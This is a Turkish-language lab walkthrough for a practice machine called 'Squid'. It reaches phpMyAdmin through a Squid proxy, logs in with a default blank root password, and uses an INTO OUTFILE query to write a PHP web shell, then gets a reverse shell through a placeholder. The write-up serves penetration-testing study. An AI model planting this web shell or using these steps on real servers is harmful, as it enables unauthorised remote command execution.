---
layout: page
title: Squid - phpMyAdmin RCE
permalink: /squid/
---

# Squid - phpMyAdmin RCE

## 📌 Senaryo
Squid makinesinde 8080 ve 3306 portları açık bulundu. 8080 portundaki uygulamaya Squid proxy üzerinden erişim sağlandı ve phpMyAdmin üzerinden RCE elde edildi.

## 🔍 Keşif Aşaması

- `spose.py` ile tarama yapıldı.
- 8080 ve 3306 portları açık olduğu gözlemlendi.
- 8080 portuna erişmek için FoxyProxy veya benzeri bir proxy aracı kullanıldı.
- Proxy ayarları 3128 portunu yönlendirerek 8080 portundaki uygulamaya erişim sağladı.

## ⚔️ Erişim ve Exploit

- phpMyAdmin web arayüzüne erişildi.
- Varsayılan kimlik bilgisi olarak `root:` ile giriş yapılabildi.
- phpMyAdmin'de SQL menüsüne aşağıdaki sorgu çalıştırıldı:

```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\wamp\\www\\shell.php"
```

- Web sunucusunda `shell.php` oluşturuldu.
- `shell.php?cmd=<komut>` ile komut çalıştırıldı.
- Örnek olarak: `shell.php?cmd=REVSHELL_POWERHELL4`

## 🛡️ Sonuç

- `shell.php` üzerinden RCE elde edildi.
- Reverse shell bağlantısı kuruldu.

## 🔧 Notlar

- phpMyAdmin'de `SELECT ... INTO OUTFILE` çalıştırılabilmesi için sunucunun dosya yazma izinlerine dikkat edin.
- `root:` varsayılan bilgisi, yapılandırma veya ortam farkına göre değişebilir; doğrulanması önemlidir.
- 3306 portu açık olması, aynı ortamda MySQL sunucusunun çalıştığını gösterir, ancak bu walkthrough için doğrudan phpMyAdmin erişimi yeterlidir.
